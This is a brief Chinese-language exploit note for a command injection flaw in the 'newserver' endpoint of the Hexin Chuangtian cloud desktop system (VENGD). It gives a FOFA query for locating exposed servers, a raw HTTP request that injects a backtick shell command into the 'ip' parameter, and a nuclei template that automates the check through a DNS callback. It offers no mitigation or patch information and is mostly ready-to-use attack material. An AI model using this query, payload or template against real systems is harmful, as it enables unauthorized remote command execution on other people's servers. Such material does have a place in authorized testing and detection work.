# 和信创天云桌面系统newserver远程命令执行漏洞

和信创天云桌面系统newserver远程命令执行漏洞

## fofa

```javascript
icon_hash="-1515283145" || title="和信下一代云桌面VENGD"
```

## poc

```javascript
POST /vesystem/index.php/New/Fn/newserver HTTP/1.1
Host: 
Accept-Encoding: gzip
Connection: close
Content-Length: 118
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

ip=`ping dnslog`&user=1&pwd=1&type=1&c_type=1&local=1&server_os_str=1&server_os_version_str=1
```



## yaml

```yaml
id: fox-template

info:
  name: fox-template
  author: fox
  severity: high

http:
  - raw:
      - |
        POST /vesystem/index.php/New/Fn/newserver HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Connection: close
        Content-Length: 118
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

        ip=`ping {{interactsh-url}}`&user=1&pwd=1&type=1&c_type=1&local=1&server_os_str=1&server_os_version_str=1

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol  # 配合 {{interactsh-url}} 关键词使用
        words:
          - "dns"
```

